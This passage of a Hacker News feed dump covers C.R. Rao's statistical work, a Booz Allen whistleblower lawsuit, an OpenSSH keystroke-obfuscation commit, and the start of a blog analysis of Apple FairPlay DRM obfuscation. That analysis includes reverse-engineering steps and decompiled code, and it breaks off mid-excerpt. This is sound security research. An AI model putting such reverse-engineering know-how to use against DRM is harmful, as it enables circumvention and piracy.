<p>During his time at ISI, Rao also made significant contributions to results on the characterization of probability distributions. These results are described in the book co-authored by Rao.<sup id="footnote-link-8"><a href="#footnote-8">8</a></sup> Some of the technical terms arising out of his characterization of probability distributions are `Rao’s Damage Model’ (1963), `Rao–Rubin Theorem’ (1964), and the `Kagan, Linnik and Rao Theorems’ (1963). Rao continued his research on the characterization of probability distributions in the U.S. in collaboration with C.G.  Khatri, and D.  Shanbhag. The results are summarized in the book <i>Choquet–Deny Functional Equations with Applications to Stochastic Models</i> by C.R.  Rao and D.N.  Shanbhag, Wiley, New York (1994). In the area of functional equations in mathematics, he introduced a new equation called the Integrated Cauchy functional equation. This equation provided a general technique for characterizing probability measures and solving problems of stochastic modelling of data for statistical analysis, as discussed in the paper “Solution to the integrated Cauchy functional equation on the whole line” (<i>Sankhya</i>. 1984. <b>46</b>: 311–319) by Ka-Sing Lau and C.R.  Rao. This equation provided a general technique for characterizing probability measures and solving problems of stochastic modelling of data for statistical analysis. </p>
<figure id="attachment_4155"><img src="http://bhavana.org.in/wp-content/uploads/2020/01/rao.jpg" alt="c" width="370" height="315"><figcaption>C.R.  Rao being awarded the National Medal of Science in 2002 by President George W. Bush  <span> National Science and Technology Medals Foundation </span></figcaption></figure>
<p>In the 1980s, Rao introduced a series of measures that quantify information and variation in data. In collaboration with Jacob Burbea, University of Pittsburgh, he introduced one such series of measures based on information-theoretic notions of entropy.<sup id="footnote-link-9"><a href="#footnote-9">9</a></sup> Rao also developed analysis of diversity (ANODIV), which generalized the idea of analysis of variance (ANOVA). He also introduced what is termed as Rao’s Quadratic Entropy,<sup id="footnote-link-10"><a href="#footnote-10">10</a></sup> a general measure of variance which is used by ecologists. Rao developed the concept of cross-entropy in the paper “Cross entropy, dissimilarity measures and characterizations of quadratic entropy” (<i>IEEE Trans. IT</i>. 1985. <b>31</b>(5): 589–593) written jointly with T.K.  Nayak.  </p>
<figure id="attachment_4156"><img src="http://bhavana.org.in/wp-content/uploads/2020/01/Roa-Guy-Medal.jpg" alt="c" width="380" height="596"><figcaption>C.R.  Rao being awarded the Royal Statistical Society’s Guy Medal in 2011 <span><strong> Courtesy </strong> B.L.S.P.  Rao</span></figcaption></figure>
<p>Matrix theory is another branch of mathematics he used in the discussion of statistical problems which in turn gave impetus to research on matrices. His most important contribution to the theory of matrices is the concept of a generalized inverse of a matrix, which is defined for both singular and non-singular matrices.<sup id="footnote-link-11"><a href="#footnote-11">11</a></sup> Using this approach, Rao provided a general technique for characterizing probability measures and solving problems of stochastic modelling of data for statistical analysis. This also allowed him and others since to provide a unified theory of least squares estimation.<sup id="footnote-link-12"><a href="#footnote-12">12</a></sup> Rao also generalized what are known as Kantorovich inequalities on matrices for use in statistics which opened a new area of research in matrix algebra.<sup id="footnote-link-13"><a href="#footnote-13">13</a></sup> </p>
<figure id="attachment_4157"><img src="http://bhavana.org.in/wp-content/uploads/2020/01/thatha-award.jpg" alt="c" width="440" height="380"><figcaption>C.R.  Rao being awarded the India Science Prize in 2010 by PM Manmohan Singh <span><strong> courtesy </strong> B.L.S.P.  Rao</span></figcaption></figure>
<p>Rao had all his education in India and did most of his research by himself without any guidance from others. He is not just a statistician. His other interests include music and dance, and he pursues his hobbies of photography and gardening. When Rao moved from Calcutta to Delhi in 1970 to be at ISI Delhi, he was surprised to find there was no dance school to teach Kuchipudi and that it did not receive the same status as Bharatanatyam, Kathak, Kathakali and Odissi. He started a Kuchipudi dance academy at Delhi and was its first president. The academy organized regular performances in Kuchipudi and Rao was its president until 1979, when he left for the U.S.</p>
<figure id="attachment_4158"><img src="http://bhavana.org.in/wp-content/uploads/2020/01/CRRaoFromTheHindu.jpg" alt="c" width="300" height="510"><figcaption><span> <strong> Courtesy </strong>  The Hindu </span></figcaption></figure>
<p>It is important to keep in mind that when Rao first joined ISI in the early 1940s, statistics was not considered an independent subject and no university offered courses at the Master’s level. Rao’s contributions have earned him a place in the history of statistics.</p>
<p>
C.R. Rao is among the worldwide leaders in statistical science over the last five decades. His research, scholarship and professional service had a profound influence in the theory and applications of statistics and are incorporated into standard references for statistical study and practice. Rao’s contributions to statistical theory earned him a place in the history of statistics.<br>
—Samuel Karlin
 </p>
<p><span data-display="false">\blacksquare</span></p><h3>Footnotes</h3>
<ol>
<li id="footnote-2">“On a class of arrangements”. 1949. <i>Proc. Edinburgh Math. Soc</i>. <b>8</b>: 119–125. <a href="#footnote-link-2">↩</a></li>
<li id="footnote-3">Frank Nielsen. 2016. <a target="_blank" href="https://magazine.amstat.org/blog/2016/12/01/raointerview/">“Interview with Professor Calyampudi Radhakrishna Rao”</a>. Amstat News (1 December). <a href="#footnote-link-3">↩</a></li>
<li id="footnote-4">“Tests with discriminant functions in multivariate analyses”. <i>Sankhya</i>. 1946. <b>7</b>: 407–414. <a href="#footnote-link-4">↩</a></li>
<li id="footnote-5">“Utilization of multiple measurements in problems of biological classification”. <i>J. Roy. Statist Soc. Series B</i>. 1948. <b>10</b>: 159–203   “Tests of significance in multivariate analysis”. <i>Biometrika</i>. 1948. <b>35</b>: 58–79. <a href="#footnote-link-5">↩</a></li>
<li id="footnote-6">“Asymptotic efficiency and limiting information”. <i>Proc. Fourth Berkeley Symp. on Math. Stat. and Prob.</i> 1961. Vol.1: 531–546. <a href="#footnote-link-6">↩</a></li>
<li id="footnote-7">“Estimation and tests of significance in factor analysis”. <i>Psychometrika</i>. 1955. <b>20</b>: 93–111. <a href="#footnote-link-7">↩</a></li>
<li id="footnote-8"><i>Characterization Problems of Mathematical Statistics</i> by A. Kagan, Yu.V. Linnik and C.R. Rao, Wiley, New York (1973). <a href="#footnote-link-8">↩</a></li>
<li id="footnote-9">“On the convexity of some divergence measures based on entropy functions”. <i>IEEE Trans, IT</i>. 1982. <b>28</b>(3): 489–495. <a href="#footnote-link-9">↩</a></li>
<li id="footnote-10">“Diversity and dissimilarity coefficients: a unified approach”. <i>Theoretical Population Biology</i>. 1982. <b>21</b>: 24-43. <a href="#footnote-link-10">↩</a></li>
<li id="footnote-11">“Generalized inverse of linear transformations: A geometric approach”. <i>Linear Algebra and its Applications</i>. 1985. <b>66</b>: 87-98. <a href="#footnote-link-11">↩</a></li>
<li id="footnote-12"> “A unified approach to inference from linear models”. 1985. <i>Proc. First International Tampere Seminar on Linear Models</i>. Eds. T. Pukkila and S. Puntanen, 361–383. <a href="#footnote-link-12">↩</a></li>
<li id="footnote-13">C.G. Khatri and Rao. “Some generalizations of Kantorovich inequality”. <i>Sankhya A</i>. 1982. <b>44</b>(1): 91-102 “The inefficiency of least squares: Extensions of Kantorovich inequality”. <i>Linear Algebra and its Applications</i>. 1985. <b>70</b>: 249–255. <a href="#footnote-link-13">↩</a></li>
</ol>
				
								
												<p>
					B.L.S.  Prakasa Rao  did his M.Stat. in 1962 from ISI Kolkata, and his Ph.D. in 1966 from Michigan State University under the guidance of Herman Rubin. He held the Ramanujan Chair professorship during 2012–17 at the C.R.  Rao Advanced Institute of Mathematics, Statistics and Computer Science, Hyderabad.

This is an edited version of the following article originally published in <i>Current Science</i>, and has been republished here with permission: B.L.S.  Prakasa Rao. 2014. “C.R. Rao: A life in statistics". <i>Current Science</i>. <b>107</b>(5): 895–901. 				</p>
								
			</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Whistleblower alleges Booz Allen was overcharging U.S. taxpayers for losses (189 pts)]]></title>
            <link>https://www.nbcnews.com/news/investigations/marine-sarah-feinberg-whistleblower-booz-allen-69-million-rcna102098</link>
            <guid>37307788</guid>
            <pubDate>Tue, 29 Aug 2023 13:41:41 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.nbcnews.com/news/investigations/marine-sarah-feinberg-whistleblower-booz-allen-69-million-rcna102098">https://www.nbcnews.com/news/investigations/marine-sarah-feinberg-whistleblower-booz-allen-69-million-rcna102098</a>, See on <a href="https://news.ycombinator.com/item?id=37307788">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p>According to the suit, the company allowed her to take leave to earn her MBA, and when she returned, put her on a team under the company’s chief financial officer, tasked with examining how to better track and analyze financial data.</p><p>She soon found something that gave her pause. Although the vast majority of its consulting clients were government agencies, Booz Allen had tried to build a business consulting for private and international clients, <a href="https://investors.boozallen.com/news-releases/news-release-details/booz-allen-hamilton-signs-us-232m-contract-support-royal-saudi#:~:text=Aug%2005%2C%202012-,Booz%20Allen%20Hamilton%20signs%20U.S.%20%2423.2M,support%20Royal%20Saudi%20Navy%20Forces">including</a> the government of Saudi Arabia.</p><p>“I discovered that our commercial and international practices were very unprofitable,” she said. “And in order to keep the company profitable, they were passing those costs onto the U.S. government contracts.”</p><p>Feinberg at first thought it might have been an oversight.</p><p>“I was very naïve at the time, and I thought that the reason people do the wrong thing is because they don’t know that something is happening, or they don’t know what the right thing is. So I went and I talked to the head of finance, and presented what I had found, and asked if he was aware of it.”</p><p>According to the lawsuit, that was <a href="https://www.linkedin.com/in/warren-kohm-52557a8/">Warren Kohm</a>, now the chief financial officer at another company. He did not respond to a request for comment.</p><p>Kohm closed the door to his office, beckoned Feinberg to have a seat, and made clear he knew exactly what she was talking about, the lawsuit alleges.</p><p>The suit says he called it a “gray zone,” but added that Defense Department auditors are “too stupid” to figure it out and demand repayment.</p><p>At that moment, Feinberg told NBC News, “I realized that this was a very intentional setup. And it wasn’t just that there was the potential to overcharge the government; the rates were built to overcharge the government. If we should have been charging $100 to the government for an hour of work, we were charging $120 for that hour of work, so that that $20 could go to subsidize the international business.”</p><figure><picture><source media="(min-width: 1240px)" srcset="https://media-cldnry.s-nbcnews.com/image/upload/t_fit-360w,f_auto,q_auto:eco,dpr_2.0/rockcms/2023-08/230828-Sarah-Feinberg-al-1157-fd7a56.jpg 2x, https://media-cldnry.s-nbcnews.com/image/upload/t_fit-360w,f_auto,q_auto:best/rockcms/2023-08/230828-Sarah-Feinberg-al-1157-fd7a56.jpg 1x"><source media="(min-width: 1000px)" srcset="https://media-cldnry.s-nbcnews.com/image/upload/t_fit-320w,f_auto,q_auto:eco,dpr_2.0/rockcms/2023-08/230828-Sarah-Feinberg-al-1157-fd7a56.jpg 2x, https://media-cldnry.s-nbcnews.com/image/upload/t_fit-320w,f_auto,q_auto:best/rockcms/2023-08/230828-Sarah-Feinberg-al-1157-fd7a56.jpg 1x"><source media="(min-width: 758px)" srcset="https://media-cldnry.s-nbcnews.com/image/upload/t_fit-560w,f_auto,q_auto:eco,dpr_2.0/rockcms/2023-08/230828-Sarah-Feinberg-al-1157-fd7a56.jpg 2x, https://media-cldnry.s-nbcnews.com/image/upload/t_fit-560w,f_auto,q_auto:best/rockcms/2023-08/230828-Sarah-Feinberg-al-1157-fd7a56.jpg 1x"><source srcset="https://media-cldnry.s-nbcnews.com/image/upload/t_fit-760w,f_auto,q_auto:eco,dpr_2.0/rockcms/2023-08/230828-Sarah-Feinberg-al-1157-fd7a56.jpg 2x, https://media-cldnry.s-nbcnews.com/image/upload/t_fit-760w,f_auto,q_auto:best/rockcms/2023-08/230828-Sarah-Feinberg-al-1157-fd7a56.jpg 1x"><img loading="lazy" src="https://media-cldnry.s-nbcnews.com/image/upload/t_fit-760w,f_auto,q_auto:best/rockcms/2023-08/230828-Sarah-Feinberg-al-1157-fd7a56.jpg" alt="Sarah Feinberg, right, with her family on Halloween in 2018.

" height="960" width="720"></picture><figcaption><span data-testid="caption__container">Sarah Feinberg, right, with her family on Halloween in 2018.

</span><span>Courtesy Feinberg family</span></figcaption></figure><p>Feinberg then began a nine-month campaign to convince her bosses to put a stop to a practice that she argues in her lawsuit she was instructed to call something other than fraud.</p><p>“So in our private conversations, I was presenting this as fraud — something that the government will catch and we’ll be penalized for it.” But, she said, “I was told to call it a compliance risk.”</p><p>Feinberg said the situation made her "very upset as a taxpayer. It made me very upset as a Marine officer. I saw how limited our resources were. And&nbsp;the&nbsp;idea that Booz was overcharging the U.S. Marine Corps for things that could be related to international contracts was absurd.”</p><p>After dozens of meetings and phone calls, she attended a meeting in the Washington, D.C., office of the company’s chief financial officer, Lloyd Howell, who is now <a href="https://nflpa.com/posts/trust-the-process-how-we-elected-lloyd-howell-as-our-new-nflpa-executive-director">director</a> of the NFL Players Association. He did not respond to a request for comment.</p><p>She planned for the meeting as a final push to get the company to stop allegedly bilking U.S. taxpayers to subsidize its money-losing private contracts. But she said that what had been a 90-minute meeting was shortened to an hour. At the outset, Howell announced that he only had 30 minutes.</p><p>Of the eight people present, she said “they were mostly older men. There were, I think, two women in the meeting. And I was definitely the youngest person in the room.”</p><p>Feinberg said she began her presentation, but Howell soon cut her off.</p><p>She quoted him as saying, “I appreciate the work that you’ve done on this … But we are not going to make it a priority.”</p><p>She was devastated.</p><p>“I walked out of that meeting. And I called my husband right afterwards and told him I was quitting my job,” she said.</p><p>In her resignation letter, she warned that Booz Allen was engaged in “risky subsidization of failing businesses.”</p><p>Feinberg said she feels relatively lucky, as <a href="https://www.nbcnews.com/politics/national-security/whistleblower-white-house-security-clearance-office-gets-suspended-n964826" target="_blank">whistleblowers</a> go. After quitting Booz Allen, she left the defense consulting business for a series of lower-paying finance jobs at media organizations. But she said she was never threatened or made to suffer for her efforts to flag alleged misconduct at a Fortune 500 company.</p><p>After she resigned, she said, two company lawyers instructed her to turn over or destroy the documents she had prepared describing the accounting scheme that allegedly defrauded the government.</p><p>She ignored them, and instead got her own lawyer — William Pittard of KaiserDillon.</p><p>Despite the tens of millions of dollars at her disposal, Feinberg said she doesn’t envision her life changing all that much. A runner with an affection for caffeinated energy drinks, she aims to stay in her tidy, older Northern Virginia home with her husband, Evan, who runs an anti-poverty nonprofit organization. They say their young children will remain in the public schools they love.</p><p>There are plans for a lake house and a trip to Italy.</p><p>But, she said, “I’m going to give a lot of it to charity, and to causes I believe in.”</p><p>As for Booz Allen, “I wish they had listened to me. It would have saved them a lot of pain.”</p></div><div><div data-activity-map="expanded-byline-article-bottom"><div><a href="https://www.nbcnews.com/author/ken-dilanian-ncpn490496"><picture><source srcset="https://media-cldnry.s-nbcnews.com/image/upload/t_focal-60x60,f_auto,q_auto:eco,dpr_2.0/newscms/2021_05/3447658/dilanianmug.jpg 2x, https://media-cldnry.s-nbcnews.com/image/upload/t_focal-60x60,f_auto,q_auto:best/newscms/2021_05/3447658/dilanianmug.jpg 1x"><img loading="lazy" src="https://media-cldnry.s-nbcnews.com/image/upload/t_focal-60x60,f_auto,q_auto:best/newscms/2021_05/3447658/dilanianmug.jpg" alt="" height="48" width="48"></picture></a></div><p><span><a href="https://www.nbcnews.com/author/ken-dilanian-ncpn490496">Ken Dilanian</a></span><span><a href="https://twitter.com/KenDilanianNBC" target="_blank" rel="noopener noreferrer"><span></span></a><a href="mailto:Ken.Dilanian@NBCUni.com" target="_blank" rel="noopener noreferrer"><span></span></a></span></p><p>Ken Dilanian is the justice and intelligence correspondent for NBC News, based in Washington.</p></div><div data-activity-map="expanded-byline-article-bottom"><p><span></span><span><a href="https://www.nbcnews.com/author/laura-strickler-ncpn894696">Laura Strickler</a></span><span><a href="https://twitter.com/strickdc" target="_blank" rel="noopener noreferrer"><span></span></a><a href="mailto:Laura.Strickler@nbcuni.com" target="_blank" rel="noopener noreferrer"><span></span></a></span></p><p>Laura Strickler is a senior investigative producer and reporter for NBC News. She is based in Washington.</p></div></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Keystroke timing obfuscation added to ssh(1) (506 pts)]]></title>
            <link>https://undeadly.org/cgi?action=article;sid=20230829051257</link>
            <guid>37307708</guid>
            <pubDate>Tue, 29 Aug 2023 13:36:05 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://undeadly.org/cgi?action=article;sid=20230829051257">https://undeadly.org/cgi?action=article;sid=20230829051257</a>, See on <a href="https://news.ycombinator.com/item?id=37307708">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
<p>Contributed by
<a href="https://www.johnsnowproject.org/">rueda</a>
on <time datetime="2023-08-28T12:58:11Z">2023-08-28</time>
from the sigint-- dept.</p>
<p>Damien Miller (<code>djm@</code>) has
<a href="https://marc.info/?l=openbsd-cvs&amp;m=169319335902218&amp;w=2">committed</a>
support for keystroke timing obfuscation to
<a href="https://man.openbsd.org/ssh.1"><code>ssh(1)</code></a>:</p>
<blockquote>
<pre>CVSROOT:	/cvs
Module name:	src
Changes by:	djm@cvs.openbsd.org	2023/08/27 21:31:16

Modified files:
	usr.bin/ssh    : clientloop.c misc.c misc.h packet.c packet.h 
	                 readconf.c readconf.h ssh_config.5 

Log message:
Add keystroke timing obfuscation to the client.

This attempts to hide inter-keystroke timings by sending interactive
traffic at fixed intervals (default: every 20<abbr>ms</abbr>) when there is only a
small amount of data being sent. It also sends fake "chaff" keystrokes
for a random interval after the last real keystroke. These are
controlled by a new <a href="https://man.openbsd.org/ssh_config.5#ObscureKeystrokeTiming">ssh_config ObscureKeystrokeTiming</a> keyword/

feedback/ok markus@
</pre>
</blockquote>


<p>This utilises a pair of
<a href="https://marc.info/?l=openbsd-cvs&amp;m=169319321102174&amp;w=2">new</a>
extensions
to the
<abbr title="secure shell">SSH</abbr>
<a href="https://cvsweb.openbsd.org/src/usr.bin/ssh/PROTOCOL?rev=1.49&amp;content-type=text/x-cvsweb-markup">protocol</a>:</p>
<blockquote>
<pre>CVSROOT:	/cvs
Module name:	src
Changes by:	djm@cvs.openbsd.org	2023/08/27 21:28:43

Modified files:
	usr.bin/ssh    : PROTOCOL kex.c kex.h packet.c ssh2.h 

Log message:
Introduce a transport-level ping facility

This adds a pair of SSH transport protocol messages SSH2_MSG_PING/PONG
to implement a ping capability. These messages use numbers in the "local
extensions" number space and are advertised using a "ping@openssh.com"
ext-info message with a string version number of "0".

ok markus@
</pre>
</blockquote>

<p>Yet another fine example of <em>security by trickery</em>, and one more reason to look forward to the next <a href="https://www.openbsd.org/">OpenBSD</a> release. Other systems will likely see this soon after via
<a href="https://www.openssh.com/portable.html">openssh-portable</a>.</p>

</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Analysis of Obfuscation Techniques Found in Apple FairPlay (178 pts)]]></title>
            <link>https://nicolo.dev/en/blog/fairplay-apple-obfuscation/</link>
            <guid>37307653</guid>
            <pubDate>Tue, 29 Aug 2023 13:32:45 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://nicolo.dev/en/blog/fairplay-apple-obfuscation/">https://nicolo.dev/en/blog/fairplay-apple-obfuscation/</a>, See on <a href="https://news.ycombinator.com/item?id=37307653">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><header><nav><h2><a href="https://nicolo.dev/">nicolo.dev</a></h2><ul><li><a href="https://nicolo.dev/en/about/">About me</a></li><li><a href="https://nicolo.dev/en/projects/">Projects</a></li><li><a href="https://nicolo.dev/blog/fairplay-apple-offuscamento/" title="it version">IT</a></li></ul></nav></header><p><span>August 28, 2023</span> – 38 min – 8082 words</p><p><strong>FairPlay</strong> comprises a set of algorithms created by Apple for digital rights management (also called DRM, <em>digital rights management</em>). FairPlay is currently used to manage the decryption of iOS applications during their installation on Apple devices. In fact, we know that Apple distributes all applications in the Apple Store through the IPA file format. The IPA file format contains encrypted information that will then be used by the operating system to install an application. All of the encrypted information is handled through FairPlay, which takes care of keeping the decryption key and the whole process secure to avoid the possibility of decrypting the contents of.ipa files to share the contents of an app (perhaps paid for) in the wrong hands.</p><p>In this article, we are going to summarize some static protection measures that I was able to find within user-space daemons running FairPlay, the DRM system used by Apple. All information is believed to be current as of the date of the article; the operating system from which the binaries were extracted is macOS 13.5.1.</p><h2 id="drm-systems-and-the-protection-of-apple-applications">DRM systems and the protection of Apple applications</h2><p>Protecting intellectual property in digital form has always been a goal on the part of companies that distribute copyrighted material. How can content be distributed without users being able to copy, view, edit, and redistribute it? Most current systems use DRM technology. Very briefly, DRM systems work in the following way: they receive as input a secret (it can be a film, an image, or an algorithm) that is not readable, for example, raw files, process the information, and transmit as output the original content. All this is done while trying to keep the process by which the original information was obtained as hidden as possible. DRM systems are most widely used for viewing copyrighted content: the user signs a contract with a service provider that promises to send the requested information (movies, TV series, books). To prevent copying of the content (the contract provides for only one user authorized to view it with that contract), the information must be accessible so that no copying or exporting of the content is expected.</p><p>From an Apple perspective, let’s assume that we want to download a paid application or new game through the Apple Store. We make the transaction, and our device gets a standalone archive, ready to be installed. Technically speaking, if there were no protection measures, a person could copy the app installer<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup> and pass it on to any other person. Result? Loss of revenue on the part of Apple and the developer who published the application since the archive copy is free. Paradoxically, by treating the IPA file format as a kind of container, there would be no technical measure to stop application sharing (archives are standalone). This is where <a href="https://en.wikipedia.org/wiki/FairPlay">FairPlay™</a> technology comes into play.</p><p>How can we protect the information contained within the archive? It is clear that we must somehow hide the contents of the archive; by doing so, even if they were to extract the IPA archive from the iPhone, attackers would not be able to access the contents. The information would have to be read only by the system processes that are in charge of installing the application. The next question would be: how can we hide the content? Here, an unparalleled Pandora’s box opens. One of the simplest and least expensive ideas from an archival point of view is to encrypt the information using a secret key. The information would be made readable again by a simple call to <code>decrypt(content, key)</code>.</p><p>The choice of secret key, however, is not a <strong>banal</strong> problem. If we think about the installation process, we know that the information will at some point have to be decrypted, that is, made readable again. Can we set a static key that applies to all iPhones sold? Certainly not. The choice of a static (i.e., hardcoded) key poses a variety of nuisances: attackers would only have to find a single key in order to gain access to all archives created by the Apple Store. However, once the key was discovered, the rest would come naturally: installers would be decrypted in no time, and the network would find itself flooded with “cracked” archives. The choice of the static key might seem advantageous to apply, perhaps by splitting the “visibility” of a set of keys per device (iPhone 12 will have a certain key, iPhone 13 a different one) by exploiting hardware<sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup>. But even this inventiveness does not work; the key to sharing is across multiple devices!</p><p>The solution actually includes the generation of “dynamic” keys, i.e., depending solely on the installation device, the account of the user who paid for the applications, and a set of metadata exchanged during the transaction (to avoid spoofing). Apple encrypts the contents of the IPA file the moment it receives a new request from the Apple Store: encryption is done with a public key associated with the Apple account. Once received, the archive is decompressed and the individual binary is decrypted using the private key within the device. The application is thus installed in plaintext and remains in plaintext within the Apple device.</p><p>The point at which the decryption takes place constitutes a large centralization point that could be useful to analyze to try to get the IPA decrypted. If attackers could figure out how the private key is generated from the device and associated account, Apple’s protection system would fail instantly. With respect to the risk of spoofing, Apple includes within its devices certain stratagems to declare to cloud services (Apple Store, iCloud, Apple Signing) that indeed the packet exchange originates from an Apple device and not from an <strong>issued</strong> or <strong>simulated</strong> Apple device. Unfortunately due to a number of technical limitations it is not possible to prove 100% “<em>I am not a simulated device, give me the binary, I am [myaccount@icloud.com]</em>”.</p><h2 id="static-analysis-and-obfuscation-techniques">Static analysis and obfuscation techniques</h2><p>FairPlay constitutes a very important technological part of Apple’s technical expertise in intellectual property protection. Several patents have been developed to describe this technology and protect it: <a href="https://patents.google.com/patent/US8934624B2"><em>US8934624B2: Decoupling rights in a digital content unit from download</em></a>, <a href="https://patents.google.com/patent/ES2373131T3"><em>ES2373131T3: Safe distribution of content using descifrado keys</em></a>. Protecting how the decryption process works is the main goal of another set of “anti-reverse engineering” technologies named software obfuscation.</p><p>In fact, we know that among the wide range of techniques that any industry insider can devise to analyze software, there is a procedure called static analysis that allows for more specific investigation of certain parts of a piece of software without sending it into execution. The main technique of static analysis is reverse engineering, which is the reconstruction of the original code by inferring information from raw binary code.</p><p>Raw binaries in fact consist of two main pieces of information to function: data and instructions. Through a multitude of steps, programs such as <a href="https://ghidra-sre.org/">Ghidra</a>, <a href="https://hex-rays.com/">IDA</a> or <a href="https://binary.ninja/">Binary Ninja</a> can reconstruct much of the original source code. Although not perfectly, the software analyst is able to infer much of the semantics of the software: how it works, what methods it calls, and what information it uses from the operating system are some of the examples of questions we can answer through reverse engineering.</p><p>Reverse engineering allows one to derive to a good degree of approximation the algorithms that FairPlay uses in order to decrypt the content. Through the data it is then possible to try to figure out how the secret key is constructed, and with enough effort an attacker could figure out how to copy the decryption method to develop a decryption tool. Deriving the algorithm would be a problem for Apple and its investors. The solution to protect the instructions and data is to apply some forms of obfuscation that make the process of reverse engineering analysis more difficult.</p><p>Forms of obfuscation are part of a discipline of computer science called Software Security that aims to protect the code and information contained within a program. Examples of applications of obfuscation include: protecting intellectual property, making reverse engineering more difficult to prevent the discovery of vulnerabilities, and mitigating exploits. These techniques are applied to the syntax of a program (i.e., the raw instructions) and make it possible to hide much of the original semantics. Manipulating raw code is very complex, so it is necessary to have a solid foundation to be able to modify the code without side effects.</p><p>As we will see in the following paragraphs, FairPlay was constructed in a way that hides much of the instruction and data. Are these techniques, however, really effective? We will attempt to answer this at the end of the article. Recall, in fact, that obfuscation and code protection are techniques that must always be changed from release to release since there is no definitive solution to protect a piece of software. Through obfuscation we are able to complicate all attempts at reverse engineering, but we certainly cannot prevent or prevent the analysis of the binary.</p><h3 id="the-fairplayd-daemon">The fairplayd daemon</h3><p>In the next few paragraphs we will attempt to analyze in detail a user-side daemon that can be found within Apple’s family of operating systems. The use of FairPlay is not limited only to the iOS mobile platform: FairPlay is also used by macOS to manage a secure channel through which to convey the digital content to be protected (movies, TV series..). This sub-technology is called <a href="https://developer.apple.com/streaming/fps/">FairPlay Streaming</a> and allows copyrighted content to be distributed by encrypting the content. A document that summarizes at a high level how it works is <a href="https://developer.apple.com/streaming/fps/FairPlayStreamingOverview.pdf"><em>FairPlay Streaming Overview</em></a>.</p><p>We then want to find out more about the use of FairPlay within macOS and see if the algorithms have been protected through obfuscations. We find that much of the management of FairPlay is assigned to a framework called <code>CoreFP.Framework</code> (<strong>Core</strong> <strong>F</strong>air <strong>P</strong>lay) found within the <code>/System/Library/PrivateFrameworks</code> folder. Private frameworks are a set of libraries dedicated to certain specific macOS features that are considered private, meaning that they have not been released for public use and all methods contained within are to be considered valid only for Apple applications.</p><p>CoreFP.Framework is currently used by some applications and daemons such as Safari and AMPLibraryAgent. Side note before continuing: if you have a private framework and are curious where it is currently being used, you can run the command <code>lsof | grep -i [name_framework]</code> where name_framework is the name of the framework library. As a result we will see a number of active processes that have opened the private framework; in this case, we briefly dwell on AMPLibraryAgent. AMPLibraryAgent is a user-space daemon that is used to manage the user’s media (<code>TV.app</code> and <code>Music.app</code>). AMPLibraryAgent is a kind of intermediate process between the encrypted content coming from Apple’s servers and the end user interacting with the decrypted content through the <code>TV.app</code> and <code>Music.app</code> clients.</p><p>FairPlayd is the daemon that is invoked by AMPLibraryAgent and is used in practice to decrypt the contents. We then begin to analyze the contents of the <code>CoreFP.Framework</code> folder. Although the privateframeworks are contained within a dynamic cache called <code>dyld</code>, the binaries of <code>CoreFP.Framework</code> are available without any special arrangements that the user has to make on the dynamic cache. Within CoreFP, we can find: <code>CoreFP</code> and <code>fairplayd</code>. <code>CoreFP</code> is the binary that is used by system processes and constitutes the library, while <code>fairplayd</code> is the user space daemon. The user space daemon uses the kernel component called <a href="https://github.com/pwn0rz/fairplay_research/blob/master/files/FairPlayIOKit_macOS_11.2_20D64">FairPlayIOKit</a>.</p><p>We extract the x86_64 version of <code>fairplayd</code> and save it to a folder of our choice via the command <code>lipo -extract x86_64 fairplayd ~/fairplayd</code>. The <code>fairplayd</code> file is a classic executable Mach-O file, it has no particular fields within the header worth mentioning. So let`s import it inside one of our reverse engineering tools (at will we can use Ghidra, IDA, Binary Ninja or Hopper). We use IDA for convenience in this article, although we must be especially careful when importing the binary into other tools (we will explain why at the end of the article). We let IDA work to reconstruct the information within the binary (through section parsing, disassembling, decompiling).</p><p><img src="https://nicolo.dev/images/blog/fairplay/ida-screen-0.png" alt="IDA Screenshot"></p><p>By default IDA opens the binary by placing the reader on the main symbol, namely <code>_main</code>, the entry point of the <code>fairplayd</code> daemon. As we can see, we immediately touch on the power of obfuscation, and after a while we realize that the entire binary was actually constructed in such a way as to obfuscate all instructions. Confirmation of this is also given by the decompiler, below is a brief excerpt:</p><div><pre tabindex="0"><code data-lang="C"><span><span>v298 <span>=</span> <span>&amp;</span>v297;
</span></span><span><span>v297 <span>=</span> (((<span>unsigned</span> <span>int</span>) v298 <span>&amp;</span><span>0x52491520</span> <span>|</span> (<span>2</span> <span>*</span>(_DWORD) v298) <span>&amp;</span><span>0x80120A40</span>) <span>^</span> <span>0x40090520</span>) <span>+</span> ((<span>-</span><span>1704077140</span> <span>-</span> ((<span>unsigned</span> <span>int</span>) v298 <span>&amp;</span><span>0x8924A850</span>)) <span>&amp;</span><span>0x8924A854</span>) <span>+</span> ((((<span>unsigned</span> <span>int</span>) v298 <span>&amp;</span><span>0x24924288</span>) <span>+</span> <span>689062540</span>) <span>&amp;</span><span>0x24924288</span> <span>|</span> (<span>2</span> <span>*</span>(_DWORD) v298) <span>&amp;</span><span>0x506D9510</span>);
</span></span><span><span>v302 <span>=</span> <span>62</span>;
</span></span><span><span>((<span>void</span>(<span>__fastcall</span><span>*</span>)(<span>__int64</span>, _QWORD, _QWORD, _QWORD))((<span>char</span><span>*</span>) <span>*</span>(<span>&amp;</span>off_1002B0BF0 <span>+</span> (<span>unsigned</span> <span>int</span>)(<span>unsigned</span> <span>__int8</span>)((<span>unsigned</span> <span>__int8</span>) v298 <span>^</span> byte_100237430[byte_1002AEEF0[(<span>unsigned</span> <span>__int8</span>) v298] <span>^</span> <span>0x3A</span>]) <span>+</span><span>944</span>) <span>-</span><span>790860942</span>))(<span>31</span> LL,<span>0</span> LL,<span>0</span> LL,<span>0</span> LL);
</span></span><span><span><span>LODWORD</span>(v303) <span>=</span> <span>1312628203</span> <span>*</span>((<span>unsigned</span> <span>int</span>) <span>&amp;</span>v303 <span>^</span> <span>0x4EBE92AB</span>) <span>+</span> <span>8</span>;
